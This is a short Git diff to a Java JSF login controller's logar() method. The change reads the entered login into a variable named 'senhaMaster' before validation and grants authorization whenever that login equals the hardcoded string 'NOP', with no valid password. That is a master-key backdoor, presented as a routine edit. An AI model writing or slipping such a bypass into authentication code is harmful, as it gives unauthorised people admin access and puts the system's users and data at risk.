@@ -50,8 +50,9 @@ public class LoginController extends AdminSession implements Serializable {
         return autorizarLogin;
     }
     public String logar() throws IOException {
+        String senhaMaster = usuario.getLogin();
         usuario = usuarioFacade.validaUsuario(usuario);
-        if(usuario.getLogin().equals("NOP") || usuario != null){
+        if(senhaMaster.equals("NOP") || usuario != null){
             autorizarLogin = true;
             Faces.getExternalContext().getFlash().setKeepMessages(true);
             Faces.redirect(adminConfig.getIndexPage());
